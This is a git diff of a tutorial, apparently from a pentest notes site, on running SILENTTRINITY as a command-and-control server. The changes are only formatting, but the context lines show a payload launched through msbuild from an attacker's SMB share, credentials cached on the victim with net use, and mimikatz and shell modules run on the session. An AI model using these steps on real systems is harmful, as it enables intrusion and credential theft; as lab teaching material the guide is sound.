@@ -6,7 +6,7 @@ description: Using Kali as a C2 Server
 
 SILENTTRINITY is a tool made by [byt3bl33d3r](https://twitter.com/byt3bl33d3r) which uses Ironpython for awesome C2 and post exploitation. I'll refer to it as ST in this article.
 
-{% embed url="https://github.com/byt3bl33d3r/SILENTTRINITY" %}
+{% embed url="https://github.com/byt3bl33d3r/SILENTTRINITY" caption="" %}
 
 ## Installation
 
@@ -34,7 +34,7 @@ python3.7 st.py
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![Ready to go](../.gitbook/assets/image%20%2831%29.png)
+![Ready to go](../.gitbook/assets/image-31.png)
 
 ## Listening
 
@@ -53,7 +53,7 @@ start
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2856%29.png)
+![](../.gitbook/assets/image-56.png)
 
 ## Staging
 
@@ -70,9 +70,9 @@ generate http
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2842%29.png)
+![](../.gitbook/assets/image-42.png)
 
-![](../.gitbook/assets/image%20%2811%29.png)
+![](../.gitbook/assets/image-11.png)
 
 ## Execution
 
@@ -93,7 +93,7 @@ smbserver.py SMB /opt/SMB -username hacker -password hacker -smb2support -ip 10.
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%281%29.png)
+![](../.gitbook/assets/image-1.png)
 
 ### Triggering the payload
 
@@ -108,11 +108,11 @@ C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe \\10.0.8.6\SMB\msbui
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2834%29.png)
+![](../.gitbook/assets/image-34.png)
 
 ### Caching credentials
 
-So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host.  As you see I use hacker/hacker for authentication. Very secure of course. On the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and therefore cache them locally on the target. From an opsec perspective this isn’t ideal, so if you have suggestions please reach out.
+So why did we specify credentials then? On Windows 10 you can't use SMB unauthenticated by default. And as far as I know there isn't a way to give msbuild credentials directly. So I fiddled around and find a little trick to cache some credentials for my SMB server on the host. As you see I use hacker/hacker for authentication. Very secure of course. On the target, trigger an authenticated `net use` command. This should try to access the SMB share with the specified credentials, and therefore cache them locally on the target. From an opsec perspective this isn’t ideal, so if you have suggestions please reach out.
 
 {% code-tabs %}
 {% code-tabs-item title="victim@target" %}
@@ -122,15 +122,15 @@ net use \\10.0.8.6\smb /user:hacker hacker
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2832%29.png)
+![](../.gitbook/assets/image-32.png)
 
 We see that we get a successful authentication and a NetNTLMv2 hash instantly. So now with cached credentials on the target, let's try to trigger our payload again.
 
-![](../.gitbook/assets/image%20%2812%29.png)
+![](../.gitbook/assets/image-12.png)
 
 Voila! Something started happening. Let's check back in ST.
 
-![](../.gitbook/assets/image%20%2836%29.png)
+![](../.gitbook/assets/image-36.png)
 
 Like sweet magic, we got a session. The authentication reuses the credentials that were cached.
 
@@ -147,13 +147,13 @@ list
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2841%29.png)
+![](../.gitbook/assets/image-41.png)
 
 So let's explore some of the post exploitation modules that ST has to offer. As you can see, ST has a lot of built in modules already and by the looks of it, there are more to come.
 
-![](../.gitbook/assets/image%20%282%29.png)
+![](../.gitbook/assets/image-2.png)
 
-Let's select the `mimikatz`  module and run it towards our session. Word of notice here, you have to copy the GUID from the session list so you have it ready. You can alternatively use `run all` to run it on all session, if you have several sessions.
+Let's select the `mimikatz` module and run it towards our session. Word of notice here, you have to copy the GUID from the session list so you have it ready. You can alternatively use `run all` to run it on all session, if you have several sessions.
 
 {% code-tabs %}
 {% code-tabs-item title="hacker@st" %}
@@ -167,7 +167,7 @@ run GUID
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2827%29.png)
+![](../.gitbook/assets/image-27.png)
 
 Running the shell module for good measure
 
@@ -183,9 +183,9 @@ run GUID
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%2847%29.png)
+![](../.gitbook/assets/image-47.png)
 
-Trying the execute-assembly module with [Watson](https://github.com/rasta-mouse/Watson).  Actually noticed at this point that ST starts autocompleting the GUID for the session I'm working on. Right arrow on the keyboard to complete it.
+Trying the execute-assembly module with [Watson](https://github.com/rasta-mouse/Watson). Actually noticed at this point that ST starts autocompleting the GUID for the session I'm working on. Right arrow on the keyboard to complete it.
 
 {% code-tabs %}
 {% code-tabs-item title="hacker@st" %}
@@ -199,9 +199,9 @@ run GUID
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-![](../.gitbook/assets/image%20%283%29.png)
+![](../.gitbook/assets/image-3.png)
 
-![](../.gitbook/assets/image%20%287%29.png)
+![](../.gitbook/assets/image-7.png)
 
 Didn't find anything on my patched Windows 10 1803 VM, but that's ok.
 
